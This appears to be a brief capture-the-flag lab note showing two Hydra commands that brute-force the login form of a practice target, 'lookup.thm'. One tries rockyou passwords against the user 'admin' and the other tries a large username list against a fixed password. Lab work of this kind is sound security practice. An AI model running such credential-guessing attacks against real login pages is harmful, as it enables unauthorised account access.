
## fixed username, try passwords

````shell
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  lookup.thm http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=Wrong password" \
  -t 64
````


## fixed password, try usernames

````shell
$ sudo apt update && sudo apt install seclists -y
$ hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -p 'password123' \
  lookup.thm http-post-form \
  "/login.php:username=^USER^&password=^PASS^:F=Wrong username or password" \
  -t 64
````